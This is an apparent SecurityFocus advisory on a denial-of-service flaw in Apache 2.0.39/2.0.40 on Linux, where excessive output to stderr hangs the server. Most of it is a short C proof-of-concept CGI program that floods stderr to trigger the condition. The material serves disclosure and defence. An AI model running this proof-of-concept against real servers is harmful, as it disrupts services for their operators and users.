source: http://www.securityfocus.com/bid/5787/info

Apache is prone to a denial of service condition when an excessive amount of data is written to stderr. This condition reportedly occurs when the amount of data written to stderr is over the default amount allowed by the operating system.

This may potentially be an issue in web applications that write user-supplied data to stderr. Additionally, locally based attackers may exploit this issue. 

This issue has been confirmed in Apache 2.0.39/2.0.40 on Linux operating systems. Apache on other platforms may also be affected. This issue does not appear to be present in versions prior to 2.0.x.

// Credit to: K.C. Wong
#include <stdio.h>
#include <time.h>
#include <unistd.h>
#include <fcntl.h>

#define SIZE 4075

void out_err()
{
        char buffer[SIZE];
        int i = 0;

        for (i = 0; i < SIZE - 1; ++i)
                buffer[i] = 'a' + (char )(i % 26);

        buffer[SIZE - 1] = '\0';

//
fcntl(2, F_SETFL, fcntl(2, F_GETFL) | O_NONBLOCK);

        fprintf(stderr, "short test\n");
        fflush(stderr);

        fprintf(stderr, "test error=%s\n", buffer);
        fflush(stderr);
} // out_err()

int main(int argc, char ** argv)
{
        fprintf(stdout, "Context-Type: text/html\r\n");
        fprintf(stdout, "\r\n\r\n");
        out_err();
        fprintf(stdout, "<HTML>\n");
        fprintf(stdout, "<body>\n");
        fprintf(stdout, "<h1>hello world</h1>\n");
        fprintf(stdout, "</body>\n");
        fprintf(stdout, "</HTML>\n");
        fflush(stdout);
        exit(0);
} // main()